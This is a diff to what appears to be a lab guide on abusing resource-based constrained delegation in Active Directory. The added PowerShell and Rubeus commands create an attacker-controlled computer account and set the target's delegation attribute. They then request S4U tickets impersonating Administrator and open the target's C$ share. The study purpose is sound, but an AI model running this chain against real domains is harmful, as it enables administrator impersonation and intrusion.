@@ -129,40 +129,56 @@ Get-ADUser -Identity "constrained-svc" -Properties TrustedToAuthForDelegation, m
 ```powershell
 Import-Module ActiveDirectory
 
-# Create target computer account - NO delegation is enabled (default)
-New-ADComputer -Name "RBCD-PC" -SAMAccountName "RBCD-PC" -Enabled $true
+# ============================================
+# 1. Target computer account - under the Delegation OU
+# ============================================
+New-ADComputer -Name “RBCD-PC” -SAMAccountName “RBCD-PC” -Enabled $true `
+    -Path “OU=Delegation,DC=warzone,DC=oxsium,DC=local”
 
-# Check - TrustedForDelegation False, msDS-AllowedToActOnBehalfOfOtherIdentity empty
-Get-ADComputer -Identity "RBCD-PC" -Properties TrustedForDelegation, msDS-AllowedToActOnBehalfOfOtherIdentity
+# Manually add the CIFS SPN (it doesn't register automatically because it's not a real domain-joined computer)
+setspn -A CIFS/RBCD-PC.warzone.oxsium.local RBCD-PC$
+
+# Check - TrustedForDelegation is False, msDS-AllowedToActOnBehalfOfOtherIdentity is empty, SPN is present
+Get-ADComputer -Identity “RBCD-PC” -Properties TrustedForDelegation, msDS-AllowedToActOnBehalfOfOtherIdentity, ServicePrincipalName
+setspn -L RBCD-PC$
 ```
 ```powershell
-# With PowerView (in a lowpriv-user context)
-$ComputerName = "EVIL-PC"
-$Password = ConvertTo-SecureString "Ev1lP@ss123!" -AsPlainText -Force
-New-ADComputer -Name $ComputerName -SAMAccountName "$ComputerName$" `
-    -AccountPassword $Password -Enabled $true `
-    -Path "CN=Computers,DC=warzone,DC=oxsium,DC=local"
+# ============================================
+# 2. An attacker-controlled computer account - in the same OU
+# (run this in a lowpriv-user context to simulate a real scenario)
+# ============================================
+$ComputerName = “EVIL-PC”
+$Password = ConvertTo-SecureString “Ev1lP@ss123!” -AsPlainText -Force
 
+New-ADComputer -Name $ComputerName -SAMAccountName “$ComputerName$” `
+    -AccountPassword $Password -Enabled $true `
+    -Path “OU=Delegation,DC=warzone,DC=oxsium,DC=local”
+
+# Find the SID of EVIL-PC$
 $evilSID = Convert-NameToSid EVIL-PC$
 
-$SD = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$evilSID)"
-$SDbytes = New-Object byte[] ($SD.BinaryLength)
-$SD.GetBinaryForm($SDbytes, 0)
-
-Set-ADComputer -Identity "RBCD-PC" -PrincipalsAllowedToDelegateToAccount "EVIL-PC$"
+# Set the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of RBCD-PC to point to EVIL-PC$
+Set-ADComputer -Identity “RBCD-PC” -PrincipalsAllowedToDelegateToAccount “EVIL-PC$”
 
 # Check
-Get-ADComputer -Identity "RBCD-PC" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
+$rbcd = Get-ADComputer -Identity “RBCD-PC” -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
+$rbcd.‘msDS-AllowedToActOnBehalfOfOtherIdentity’.Access
 
-# Convert Password to NTLM Hash
-.\Rubeus.exe hash /password:sako2005! /user:EVIL-PC$ /domain:warzone.oxsium.local
+# ============================================
+# 3. Attack chain - Rubeus with S4U2Self + S4U2Proxy
+# ============================================
 
-# Full chain with Rubeus
+# Convert the password to an NTLM hash
+.\Rubeus.exe hash /password:Ev1lP@ss123! /user:EVIL-PC$ /domain:warzone.oxsium.local
+
+# Full chain - Replace BURAYA_RC4_HASH with the rc4_hmac value from the output above
 .\Rubeus.exe s4u /user:EVIL-PC$ /rc4:BURAYA_RC4_HASH `
     /impersonateuser:Administrator `
     /msdsspn:CIFS/RBCD-PC.warzone.oxsium.local `
     /domain:warzone.oxsium.local `
     /ptt
 
+# Verification
+klist
 ls \\RBCD-PC.warzone.oxsium.local\C$
 ```
